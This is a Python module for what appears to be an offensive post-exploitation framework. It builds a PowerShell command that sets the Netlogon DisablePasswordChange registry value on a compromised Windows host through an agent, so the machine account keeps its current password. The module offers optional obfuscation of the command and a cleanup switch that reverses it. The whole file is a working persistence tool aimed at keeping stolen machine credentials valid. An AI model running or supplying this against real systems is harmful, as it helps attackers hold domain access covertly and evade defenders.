from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-DisableMachineAcctChange',

            'Author': ['@harmj0y'],

            'Description': ('Disables the machine account for the target system '
                            'from changing its password automatically.'),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : True,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'CleanUp' : {
                'Description'   :   'Switch. Re-enable machine password changes.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        cleanup = self.options['CleanUp']['Value']

        if cleanup.lower() == 'true':
            script = "$null=Set-ItemProperty -Force -Path HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters -Name DisablePasswordChange -Value 0; 'Machine account password change re-enabled.'"
            if obfuscate:
                script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
            return script
        
        script = "$null=Set-ItemProperty -Force -Path HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters -Name DisablePasswordChange -Value 1; 'Machine account password change disabled.'"
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script
